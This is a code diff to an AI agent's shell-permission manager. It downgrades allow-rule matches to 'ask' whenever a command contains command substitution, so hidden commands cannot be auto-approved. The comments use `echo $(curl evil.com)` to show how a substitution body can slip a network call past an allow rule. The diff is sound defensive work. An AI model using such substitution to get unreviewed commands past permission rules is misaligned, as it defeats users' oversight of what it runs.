@@ -26,6 +26,7 @@ import {
   isShellCommandReadOnlyASTInDirectory,
 } from '../utils/shellAstParser.js';
 import {
+  detectCommandSubstitution,
   getShellConfiguration,
   normalizeMonitorCommand,
 } from '../utils/shell-utils.js';
@@ -99,6 +100,14 @@ const DECISION_PRIORITY: Readonly<Record<PermissionDecision, number>> = {
  * and swallow a separator the spawned command really executes. Monitor
  * therefore keeps the conservative splitter, and stays covered by `Bash(...)`
  * rules through it.
+ *
+ * The `$` / backtick bail above hands `$(…)`, backticks and `<()`/`>()` to
+ * `splitCompoundCommand`, which treats them as plain argument text (they are
+ * not compound separators), so `echo $(curl evil.com)` arrives here as one
+ * segment rooted at `echo` — an allow rule for the root would cover the
+ * substitution body no rule can see. That gap is closed one layer up in
+ * `evaluateSingle`, which downgrades allow matches on substitution-bearing
+ * segments to 'ask'.
  */
 function splitCommandForRules(command: string, toolName: string): string[] {
   if (
@@ -466,7 +475,10 @@ export class PermissionManager {
    *
    * For shell commands (run_shell_command), the result is the most restrictive
    * of:
-   *   1. The base decision from Bash / command-pattern rules.
+   *   1. The base decision from Bash / command-pattern rules. An allow match on
+   *      a command that executes command substitution (`$(…)`, backticks,
+   *      `<()`/`>()`) is downgraded to 'ask': the substitution body is an
+   *      argument of the root command, so no `Bash(...)` rule can review it.
    *   2. The decision derived from virtual file / network operations extracted
    *      via `extractShellOperationsAcrossCommand` — allows Read/Edit/Write/WebFetch rules
    *      to match equivalent shell commands (e.g. `cat` → Read, `curl` → WebFetch).
@@ -483,6 +495,22 @@ export class PermissionManager {
         : undefined;
 
     const matches = this.createRuleMatcher(ctx, pathCtx);
+
+    // Command substitution (`$(…)`, backticks, `<()`/`>()`) is invisible to
+    // `Bash(...)` rule matching: the substitution body is just an argument of
+    // the root command, so `echo $(curl evil.com)` is one segment whose root
+    // is `echo` — an allow rule like `Bash(echo *)` matches it and silently
+    // auto-approves the hidden `curl`, while deny and ask rules can never see
+    // inside the body either (see `extractShellOperations`'s known
+    // limitations). Splitting the body out is statically unsound, so instead
+    // any allow match on a command that executes substitution is downgraded
+    // to 'ask' below. Quoted spellings (`echo '$(curl …)'`) execute nothing
+    // — `detectCommandSubstitution` follows bash quoting rules — and stay
+    // allowable.
+    const hasCommandSubstitution =
+      command !== undefined &&
+      SHELL_TOOL_NAMES.has(toolName) &&
+      detectCommandSubstitution(command);
 
     // Compute the base decision from explicit Bash/file/domain rules.
     // Using an IIFE to keep the priority-cascade logic clean.
@@ -512,7 +540,9 @@ export class PermissionManager {
           matches(rule) &&
           !this.isMcpAllowAmbiguous(rule.toolName, mcpIdentity)
         ) {
-          return 'allow';
+          // See `hasCommandSubstitution` above: an allow match must not
+          // auto-approve a command whose substitution body no rule reviewed.
+          return hasCommandSubstitution ? 'ask' : 'allow';
         }
       }
       return 'default';
